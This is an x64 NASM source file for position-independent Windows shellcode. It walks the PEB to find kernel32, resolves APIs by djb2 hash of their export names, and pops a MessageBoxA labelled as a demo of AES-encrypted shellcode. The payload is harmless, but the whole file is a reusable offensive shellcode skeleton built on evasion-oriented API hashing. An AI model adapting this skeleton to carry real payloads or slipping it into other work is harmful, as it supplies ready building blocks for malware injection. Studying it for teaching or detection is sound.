; x64 position-independent demo shellcode: pops a MessageBoxA.
; PEB -> kernel32 -> resolve GetProcAddress/LoadLibraryA (djb2 hash) ->
; LoadLibraryA("user32.dll") -> GetProcAddress(user32, "MessageBoxA") -> call it.
; Assemble: nasm -f bin -o demo_shellcode.bin demo_shellcode.asm

BITS 64
global _start

%define HASH_GetProcAddress 0xcf31bb1f
%define HASH_LoadLibraryA   0x5fbff0fb

section .text
_start:
    ; ---- resolve kernel32 base via PEB (InMemoryOrderModuleList) ----
    xor rbx, rbx
    mov rbx, [gs:rbx + 0x60]    ; PEB
    mov rbx, [rbx + 0x18]       ; PEB->Ldr
    mov rbx, [rbx + 0x20]       ; InMemoryOrderModuleList head
    mov rbx, [rbx]              ; this exe
    mov rbx, [rbx]              ; ntdll.dll
    mov rbx, [rbx]              ; kernel32.dll
    mov rbx, [rbx + 0x20]       ; DllBase
    mov r15, rbx                ; r15 = kernel32 base

    ; ---- GetProcAddress ----
    mov edx, HASH_GetProcAddress
    call resolve
    test rax, rax
    jz done
    mov r12, rax                ; r12 = GetProcAddress

    ; ---- LoadLibraryA ----
    mov edx, HASH_LoadLibraryA
    call resolve
    test rax, rax
    jz done
    mov r13, rax                ; r13 = LoadLibraryA

    ; ---- LoadLibraryA("user32.dll") ----
    sub rsp, 0x28
    lea rcx, [rel user32_name]
    call r13
    add rsp, 0x28
    test rax, rax
    jz done
    mov r14, rax                ; r14 = user32 base

    ; ---- resolve MessageBoxA from user32 via GetProcAddress ----
    lea rsi, [rel msgbox_name]
    call hash_string            ; eax = hash("MessageBoxA")
    mov edx, eax                ; target hash
    mov rbx, r14                ; module = user32
    call resolve
    test rax, rax
    jz done
    mov rbp, rax                ; rbp = MessageBoxA

    ; ---- MessageBoxA(NULL, text, title, MB_OK) ----
    sub rsp, 0x28
    xor rcx, rcx                ; hWnd = NULL
    lea rdx, [rel msg_text]
    lea r8,  [rel msg_title]
    xor r9, r9                  ; MB_OK = 0
    call rbp
    add rsp, 0x28

done:
    ret

; ===========================================================================
; resolve: rbx = module base, edx = target hash -> rax = function VA (0 if not)
; ===========================================================================
resolve:
    push rbx
    mov eax, [rbx + 0x3c]       ; e_lfanew
    add rax, rbx                ; NT headers
    mov eax, [rax + 0x88]       ; Export dir RVA (PE32+ DataDirectory[0])
    add rax, rbx                ; Export dir VA
    mov r8d,  [rax + 0x18]      ; NumberOfNames
    mov r9d,  [rax + 0x20]      ; AddressOfNames RVA
    add r9,  rbx
    mov r10d, [rax + 0x24]      ; AddressOfNameOrdinals RVA
    add r10, rbx
    mov r11d, [rax + 0x1C]      ; AddressOfFunctions RVA
    add r11, rbx
    xor rcx, rcx                ; counter
.resloop:
    cmp ecx, r8d
    jge .notfound
    mov esi, [r9 + rcx*4]       ; name RVA
    add rsi, rbx                ; name string
    push rdx
    push rcx
    call hash_string
    pop rcx
    pop rdx
    cmp eax, edx
    je .found
    inc ecx
    jmp .resloop
.found:
    movzx eax, word [r10 + rcx*2]   ; ordinal
    mov eax, [r11 + rax*4]          ; function RVA
    add rax, rbx                    ; VA
    pop rbx
    ret
.notfound:
    xor eax, eax
    pop rbx
    ret

; ===========================================================================
; hash_string: rsi -> NUL-terminated name, djb2 hash in eax
; ===========================================================================
hash_string:
    push rcx
    mov eax, 5381
.loop:
    movzx ecx, byte [rsi]
    test ecx, ecx
    jz .done
    imul eax, eax, 33
    add eax, ecx
    inc rsi
    jmp .loop
.done:
    pop rcx
    ret

section .data
user32_name: db "user32.dll", 0
msgbox_name: db "MessageBoxA", 0
msg_text:    db "Hello from AES-encrypted shellcode!", 0
msg_title:   db "HackerAI", 0
